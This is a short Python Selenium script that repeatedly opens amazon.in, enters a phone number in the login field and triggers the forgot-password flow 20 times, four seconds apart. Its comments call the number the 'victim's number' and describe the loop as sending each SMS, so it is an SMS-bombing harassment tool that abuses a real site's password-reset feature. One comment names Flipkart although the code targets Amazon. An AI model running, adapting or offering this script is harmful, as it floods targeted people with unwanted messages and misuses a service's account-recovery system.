from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
for i in range(20):
	# create instance of Chrome webdriver
	driver=webdriver.Chrome()
	driver.get("https://www.amazon.in/")

	# find the element where we have to
	# enter the xpath
	# target mobile number, change it to victim's number and
	# also ensure that it's registered on flipkart

	driver.find_element_by_xpath('//*[@id="ap_email"]').send_keys('xxxx6126')
	# find the element continue
	# request using xpath
	# clicking on that element

	driver.find_element_by_xpath('//*[@id="continue"]').click()
	# find the element to send a forgot password
	# request using xpath

	driver.find_element_by_xpath('//*[@id="auth-fpp-link-bottom"]').click()
	driver.find_element_by_xpath('//*[@id="continue"]').click()

	# set the interval to send each sms
	time.sleep(4)

	# Close the browser
	driver.close()
